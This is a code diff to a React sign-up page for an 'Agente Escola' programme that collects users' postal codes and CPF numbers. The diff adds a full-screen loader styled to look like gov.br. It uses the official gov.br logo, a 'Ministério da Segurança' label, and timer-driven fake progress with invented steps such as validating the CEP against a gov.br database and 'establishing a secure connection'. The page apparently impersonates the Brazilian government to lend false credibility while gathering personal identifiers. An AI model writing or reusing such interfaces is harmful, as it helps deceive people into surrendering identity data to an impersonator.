@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useRef } from "react";
 import { Check, MapPin, DollarSign, GraduationCap, Award, Search } from "lucide-react";
 import { useLocation } from "../context/LocationContext";
 import { useUser } from "../context/UserContext";
@@ -273,9 +273,12 @@ const Inscription: React.FC = () => {
 	const { setLocationInfo } = useLocation();
 	const { setUserName } = useUser();
 
-	const [showVerifyingPopup, setShowVerifyingPopup] = useState(false);
-	const [showAvailablePopup, setShowAvailablePopup] = useState(false);
-	const [currentStep, setCurrentStep] = useState(0);
+	const [showGovLoader, setShowGovLoader] = useState(false);
+	const [loaderProgress, setLoaderProgress] = useState(0);
+	const [loaderDotActive, setLoaderDotActive] = useState(0);
+	const [loaderStep, setLoaderStep] = useState(0);
+	const resultRef = useRef<HTMLDivElement>(null);
+	const cpfFormRef = useRef<HTMLDivElement>(null);
 
 	useEffect(() => {
 		ReactPixel.init("617874301266607");
@@ -330,18 +333,27 @@ const Inscription: React.FC = () => {
 		setLoading(true);
 		setError("");
 		setAddressInfo(null);
-		setShowVerifyingPopup(true);
-		setCurrentStep(0);
+		setShowGovLoader(true);
+		setLoaderProgress(0);
+		setLoaderDotActive(0);
+		setLoaderStep(0);
+
+		const progressTimer = setInterval(() => {
+			setLoaderProgress(prev => prev >= 88 ? prev : prev + 1.2);
+		}, 70);
+		const dotTimer = setInterval(() => {
+			setLoaderDotActive(prev => (prev + 1) % 5);
+		}, 420);
 
 		try {
 			const cleanCEP = cep.replace(/\D/g, "");
-			
+
 			await new Promise(resolve => setTimeout(resolve, 2000));
-			setCurrentStep(1);
-			
+			setLoaderStep(1);
+
 			const locationData = await validateCEP(cleanCEP);
-			
-			setCurrentStep(2);
+
+			setLoaderStep(2);
 			await new Promise(resolve => setTimeout(resolve, 1500));
 
 			const addressInfo: AddressInfo = {
@@ -358,16 +370,20 @@ const Inscription: React.FC = () => {
 
 			setAddressInfo(addressInfo);
 			setLocationInfo(cleanCEP, locationData.schools);
-			
-			setShowVerifyingPopup(false);
+
+			clearInterval(progressTimer);
+			clearInterval(dotTimer);
+			setLoaderProgress(100);
 			await new Promise(resolve => setTimeout(resolve, 500));
-			setShowAvailablePopup(true);
-			await new Promise(resolve => setTimeout(resolve, 3000));
-			setShowAvailablePopup(false);
+			setShowGovLoader(false);
+			await new Promise(resolve => setTimeout(resolve, 250));
+			resultRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' });
 
 		} catch (err) {
+			clearInterval(progressTimer);
+			clearInterval(dotTimer);
 			setError("CEP não encontrado. Por favor, verifique o número e tente novamente.");
-			setShowVerifyingPopup(false);
+			setShowGovLoader(false);
 		} finally {
 			setLoading(false);
 		}
@@ -430,6 +446,8 @@ const Inscription: React.FC = () => {
 				setName(result.data.nome);
 				setUserName(result.data.nome);
 			}
+			await new Promise(resolve => setTimeout(resolve, 80));
+			cpfFormRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' });
 		} catch (err) {
 			setError("CPF inválido. Por favor, verifique o número e tente novamente.");
 			setVerificationComplete(false);
@@ -448,72 +466,121 @@ const Inscription: React.FC = () => {
 
 	return (
 		<main className="container mx-auto px-4 py-4 flex-grow">
-			{showVerifyingPopup && (
-				<div className="fixed top-0 left-0 right-0 bg-white shadow-lg z-50 animate-slideDown">
-					<div className="max-w-2xl mx-auto p-4">
-						<div className="flex items-center gap-4">
-							{currentStep === 0 && (
-								<>
-									<div className="w-8 h-8">
-										<div className="w-8 h-8 border-4 border-[#1351B4] border-l-transparent rounded-full animate-spin"></div>
-									</div>
-									<div>
-										<h2 className="text-lg font-semibold">Verificando disponibilidade...</h2>
-										<p className="text-sm text-gray-600">
-											Estamos consultando a base de dados para verificar disponibilidade na sua região.
-										</p>
-									</div>
-								</>
-							)}
-							{currentStep === 1 && (
-								<>
-									<div className="w-8 h-8">
-										<div className="w-8 h-8 border-4 border-[#1351B4] border-l-transparent rounded-full animate-spin"></div>
-									</div>
-									<div>
-										<h2 className="text-lg font-semibold">Analisando região...</h2>
-										<p className="text-sm text-gray-600">
-											Verificando vagas disponíveis e unidades próximas ao seu endereço.
-										</p>
-									</div>
-								</>
-							)}
-							{currentStep === 2 && (
-								<>
-									<div className="w-8 h-8">
-										<div className="w-8 h-8 border-4 border-[#1351B4] border-l-transparent rounded-full animate-spin"></div>
-									</div>
-									<div>
-										<h2 className="text-lg font-semibold">Finalizando...</h2>
-										<p className="text-sm text-gray-600">
-											Preparando informações sobre as vagas disponíveis.
-										</p>
-									</div>
-								</>
-							)}
-						</div>
-					</div>
+			{showGovLoader && (
+			<div
+				className="fixed inset-0 z-50 flex flex-col overflow-hidden"
+				style={{
+					fontFamily: 'Rawline, Helvetica, Arial, sans-serif',
+					backgroundColor: 'rgb(7, 29, 65)',
+					backgroundImage: 'radial-gradient(circle, rgba(255,255,255,0.06) 1px, transparent 1px)',
+					backgroundSize: '20px 20px'
+				}}
+			>
+				{/* Cross pattern overlay */}
+				<div className="absolute inset-0 opacity-5 pointer-events-none">
+					<div
+						className="absolute inset-0"
+						style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='1'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")` }}
+					/>
 				</div>
-			)}
 
-			{/* Available Popup */}
-			{showAvailablePopup && addressInfo && (
-				<div className="fixed top-0 left-0 right-0 bg-green-50 shadow-lg z-50 animate-slideDown">
-					<div className="max-w-2xl mx-auto p-4">
-						<div className="flex items-center gap-4">
-							<div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
-								<Check className="w-5 h-5 text-green-500" />
+				{/* Top bar */}
+				<div className="bg-[#071D41] py-2 mt-4 relative z-10">
+					<div className="max-w-4xl mx-auto px-4 flex items-center justify-between">
+						<img
+							src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png"
+							alt="gov.br"
+							className="h-6 object-contain"
+							style={{ filter: 'brightness(0) invert(1)', opacity: 0.8 }}
+						/>
+						<span className="text-white/40 tracking-wider" style={{ fontSize: '10px' }}>MINISTÉRIO DA SEGURANÇA</span>
+					</div>
+				</div>
+
+				{/* Center */}
+				<div className="flex-1 flex items-center justify-center px-4">
+					<div className="flex flex-col items-center text-center text-white max-w-sm w-full mx-auto">
+						<div className="mb-8">
+							<div className="w-16 h-16 mx-auto relative">
+								<div
+									className="absolute inset-0 rounded-full"
+									style={{
+										borderWidth: '2px',
+										borderStyle: 'solid',
+										borderColor: 'rgb(22,136,33) rgba(255,255,255,0.1) rgba(255,255,255,0.1)',
+										animation: '1s linear infinite govSpin'
+									}}
+								/>
+								<div className="absolute inset-0 flex items-center justify-center text-white/90">
+									<svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+										<path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+									</svg>
+								</div>
 							</div>
-							<div>
-								<h2 className="text-lg font-semibold">Vagas Disponíveis!</h2>
-								<p className="text-sm text-gray-600">
-									Existem {addressInfo.vagasDisponiveis} vagas disponíveis para {addressInfo.bairro}, {addressInfo.localidade}/{addressInfo.uf}.
-								</p>
+						</div>
+
+						<h2 className="text-lg font-medium mb-2">Verificando disponibilidade</h2>
+						<p className="text-sm mb-8 leading-relaxed" style={{ opacity: 0.6 }}>
+							Consultando a base de dados para verificar seu CEP<br />
+							e a disponibilidade de vagas na sua região.
+						</p>
+
+						{/* Progress bar */}
+						<div className="w-full max-w-xs mx-auto mb-6">
+							<div className="h-0.5 rounded-full overflow-hidden" style={{ background: 'rgba(255,255,255,0.1)' }}>
+								<div
+									className="h-full rounded-full"
+									style={{
+										width: `${loaderProgress}%`,
+										background: 'rgb(22,136,33)',
+										transition: 'width 0.6s cubic-bezier(0.4,0,0.2,1)'
+									}}
+								/>
+							</div>
+						</div>
+
+						{/* Dots */}
+						<div className="flex justify-center gap-2">
+							{[0,1,2,3,4].map(i => (
+								<div
+									key={i}
+									className="w-2 h-2 rounded-full"
+									style={{
+										transition: 'all 0.3s',
+										backgroundColor: i <= loaderDotActive ? 'rgb(22,136,33)' : 'rgba(255,255,255,0.15)',
+										transform: i === loaderDotActive ? 'scale(1.4)' : 'scale(1)'
+									}}
+								/>
+							))}
+						</div>
+					</div>
+				</div>
+
+				{/* Bottom status panel */}
+				<div className="relative z-10 py-5 px-4" style={{ borderTop: '1px solid rgba(255,255,255,0.05)' }}>
+					<div className="max-w-md mx-auto">
+						<div className="rounded-lg p-4" style={{ background: 'rgba(255,255,255,0.05)', backdropFilter: 'blur(4px)' }}>
+							<p className="text-white/50 uppercase tracking-wider mb-2" style={{ fontSize: '10px' }}>O que está acontecendo</p>
+							<div className="space-y-2">
+								{[
+									{ label: 'Validando seu CEP na base de dados gov.br', active: loaderStep >= 1 },
+									{ label: 'Verificando vagas disponíveis na região', active: loaderStep >= 2 },
+									{ label: 'Estabelecendo conexão segura', active: false },
+								].map((item, i) => (
+									<div key={i} className="flex items-center gap-2">
+										<div
+											className={`w-1.5 h-1.5 rounded-full flex-shrink-0${i === 2 ? ' animate-pulse' : ''}`}
+											style={{ background: 'rgb(0,156,59)' }}
+										/>
+										<span className="text-xs" style={{ color: 'rgba(255,255,255,0.7)' }}>{item.label}</span>
+									</div>
+								))}
 							</div>
 						</div>
 					</div>
 				</div>
-			)}
+			</div>
+		)}
 
 			<div className="max-w-lg mx-auto">
 				<div className="mb-6">
@@ -530,7 +597,7 @@ const Inscription: React.FC = () => {
 						</p>
 					</div>
 
-					<div className="mb-6">
+					<div ref={resultRef} className="mb-6">
 						<label htmlFor="cep" className="block text-lg font-bold mb-2">
 							CEP
 						</label>
@@ -594,7 +661,7 @@ const Inscription: React.FC = () => {
 								</div>
 							</div>
 
-							<div className="mt-8 bg-white rounded-lg p-6">
+							<div ref={cpfFormRef} className="mt-8 bg-white rounded-lg p-6">
 								<h2 className="text-[#1351B4] text-2xl font-bold mb-2">Formulário de Inscrição</h2>
 								<p className="text-gray-600 mb-6">
 									Preencha seus dados abaixo para se inscrever no programa Agente Escola.
